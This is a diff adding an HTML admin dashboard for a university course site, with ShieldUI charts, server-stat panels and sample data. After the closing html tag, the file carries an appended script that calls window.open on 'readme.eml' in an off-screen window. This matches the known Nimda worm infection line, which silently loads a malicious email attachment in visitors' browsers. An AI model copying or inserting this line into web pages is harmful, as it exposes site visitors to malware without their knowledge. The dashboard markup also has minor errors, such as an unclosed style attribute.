@@ -1,0 +1,225 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard - Administrator</title>
+
+    <link rel="stylesheet" type="text/css" href="bootstrap/css/bootstrap.min.css" />
+    <link rel="stylesheet" type="text/css" href="font-awesome/css/font-awesome.min.css" />
+    <link rel="stylesheet" type="text/css" href="css/local.css" />
+
+    <script type="text/javascript" src="js/jquery-1.10.2.min.js"></script>
+    <script type="text/javascript" src="bootstrap/js/bootstrap.min.js"></script>
+
+    <!-- you need to include the shieldui css and js assets in order for the charts to work -->
+    <link rel="stylesheet" type="text/css" href="http://www.shieldui.com/shared/components/latest/css/shieldui-all.min.css" />
+    <link rel="stylesheet" type="text/css" href="http://www.shieldui.com/shared/components/latest/css/light-bootstrap/all.min.css" />
+    <link id="gridcss" rel="stylesheet" type="text/css" href="http://www.shieldui.com/shared/components/latest/css/dark-bootstrap/all.min.css" />
+
+    <script type="text/javascript" src="http://www.shieldui.com/shared/components/latest/js/shieldui-all.min.js"></script>
+    <script type="text/javascript" src="http://www.prepbootstrap.com/Content/js/gridData.js"></script>
+</head>
+<body>
+
+    <div id="wrapper">
+
+          <nav class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+            <div class="navbar-header">
+                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                    <span class="sr-only">Toggle navigation</span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                </button>
+                <a class="navbar-brand" href="index.html">Admin Panel</a>
+            </div>
+
+            <div class="collapse navbar-collapse navbar-ex1-collapse">
+                <ul id="active" class="nav navbar-nav side-nav">
+                    <li class="selected"><a href="index.html"><i class="fa fa-bullseye"></i> Dashboard</a></li>
+                    
+                    <li><a href="bootstrap-grid.html"><i class="fa fa-table"></i> Course Structure</a></li>
+                </ul>
+
+                <ul class="nav navbar-nav navbar-right navbar-user">
+                    
+                    <li class="dropdown user-dropdown">
+                        <a href="#" class="dropdown-toggle" data-toggle="dropdown"><i class="fa fa-user"></i> Prof. DB Phatak<b class="caret"></b></a>
+                    </li>
+                </ul>
+            </div>
+        </nav>
+
+        <div id="page-wrapper">
+
+            <div class="row">
+                <div class="col-lg-12">
+                    <h1>Dashboard Summary</h1>
+                    
+                </div>
+            </div>
+			
+
+            <div class="row">
+<!--style="width: 200px; height: 100px; overflow-x: scroll;-->
+                <div class="col-md-3" >
+                    <div class="panel panel-primary">
+                        <div class="panel-heading">
+                            <h3 class="panel-title"><i class="fa fa-bar-chart-o"></i> Disk Usage Of All Courses</h3>
+                        </div>
+                        <div class="panel-body" style="overflow-y : scroll; height: 300px; " >
+                            <div id="shieldui-chart1"></div>
+                        </div>
+                    </div>
+                </div>
+ 
+            <div class="row">
+                <div class="col-lg-8">
+                    <div class="panel panel-primary">
+                        <div class="panel-heading">
+                            <h3 class="panel-title"><i class="fa fa-bar-chart-o"></i> Number Of Registrations Per Day</h3>
+                        </div>
+                        <div class="panel-body" style="overflow-x : hidden; overflow-y : hidden; height: 320px;" >
+                            <div id="shieldui-chart2"></div>
+                        </div>
+                    </div>
+                </div>
+		<br /><br />
+                <div class="col-lg-12">
+                    <div class="panel panel-primary">
+                        <div class="panel-heading">
+                            <h3 class="panel-title"><i class="fa fa-magnet"></i> Course Enrollment Details</h3>
+                        </div>
+                        <div class="panel-body" style="overflow-x : auto; overflow-y : scroll; height: 250px;">
+                            <ul class="server-stats">
+                                <li>
+                                    <div class="key pull-right">CPU</div>
+                                    <div class="stat">
+                                        <div class="info">60% / 37°C / 3.3 Ghz</div>
+                                        <div class="progress progress-small">
+                                            <div style="width: 70%;" class="progress-bar progress-bar-danger"></div>
+                                        </div>
+                                    </div>
+                                </li>
+                                <li>
+                                    <div class="key pull-right">Mem</div>
+                                    <div class="stat">
+                                        <div class="info">29% / 4GB (16 GB)</div>
+                                        <div class="progress progress-small">
+                                            <div style="width: 29%;" class="progress-bar"></div>
+                                        </div>
+                                    </div>
+                                </li>
+                                <li>
+                                    <div class="key pull-right">LAN</div>
+                                    <div class="stat">
+                                        <div class="info">6 Mb/s <i class="fa fa-caret-down"></i>&nbsp; 3 Mb/s <i class="fa fa-caret-up"></i></div>
+                                        <div class="progress progress-small">
+                                            <div style="width: 48%;" class="progress-bar progress-bar-inverse"></div>
+                                        </div>
+                                    </div>
+                                </li>
+                            </ul>
+                        </div>
+                    </div>
+
+                </div>
+
+		<!--<div class="row">-->
+
+                <div class="row">
+                <div class="col-lg-12">
+                    <div class="panel panel-primary" style="overflow-x:scroll">
+                        <div class="panel-heading">
+                            <h3 class="panel-title"><i class="fa fa-bar-chart-o"></i> Number Of emails Coursewise</h3>
+                        </div>
+                        <div class="panel-body" style="overflow-x : scroll; overflow-y : auto; height: 250px;>
+                            <div id="shieldui-chart2"></div>
+                        </div>
+                    </div>
+                </div>
+               
+            </div>
+        </div>
+
+    </div>
+    <!-- /#wrapper -->
+    <script type="text/javascript">
+        jQuery(function ($) {
+            var performance = [12, 43, 34, 22, 12, 33, 4, 17, 22, 34, 54, 67],
+                visits = [123, 323, 443, 32],
+                traffic = [
+                {
+                    Source: "Direct", Amount: 323, Change: 53, Percent: 23, Target: 600
+                },
+                {
+                    Source: "Refer", Amount: 345, Change: 34, Percent: 45, Target: 567
+                },
+                {
+                    Source: "Social", Amount: 567, Change: 67, Percent: 23, Target: 456
+                },
+                {
+                    Source: "Search", Amount: 234, Change: 23, Percent: 56, Target: 890
+                },
+                {
+                    Source: "Internal", Amount: 111, Change: 78, Percent: 12, Target: 345
+                }];
+
+
+            $("#shieldui-chart1").shieldChart({
+                theme: "dark",
+
+                primaryHeader: {
+                    text: "Visitors"
+                },
+                exportOptions: {
+                    image: false,
+                    print: false
+                },
+                dataSeries: [{
+                    seriesType: "area",
+                    collectionAlias: "Q Data",
+                    data: performance
+                }]
+            });
+
+            $("#shieldui-chart2").shieldChart({
+                theme: "dark",
+                primaryHeader: {
+                    text: "Traffic Per week"
+                },
+                exportOptions: {
+                    image: false,
+                    print: false
+                },
+                dataSeries: [{
+                    seriesType: "pie",
+                    collectionAlias: "CS101",
+                    data: visits
+                }]
+            });
+
+            $("#shieldui-grid1").shieldGrid({
+                dataSource: {
+                    data: traffic
+                },
+                sorting: {
+                    multiple: true
+                },
+                rowHover: false,
+                paging: false,
+                columns: [
+                { field: "Source", width: "170px", title: "Source" },
+                { field: "Amount", title: "Amount" },                
+                { field: "Percent", title: "Percent", format: "{0} %" },
+                { field: "Target", title: "Target" },
+                ]
+            });            
+        });        
+    </script>
+</body>
+</html>
+
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
